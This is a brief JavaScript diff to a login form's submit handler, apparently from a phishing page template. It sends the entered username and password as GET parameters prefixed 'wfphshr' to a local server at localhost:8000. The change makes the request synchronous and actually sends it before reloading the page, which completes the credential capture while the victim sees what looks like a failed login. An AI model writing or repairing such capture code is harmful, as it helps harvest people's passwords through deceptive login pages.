@@ -40,7 +40,9 @@ form.onsubmit = function(event){
 
         let senha = document.getElementById('inputSenha').value;
 
-        xhr.open('GET',`http://localhost:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`)
+        xhr.open('GET',`http://localhost:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`, false)
+
+        xhr.send(null);
 
         location.reload();
         
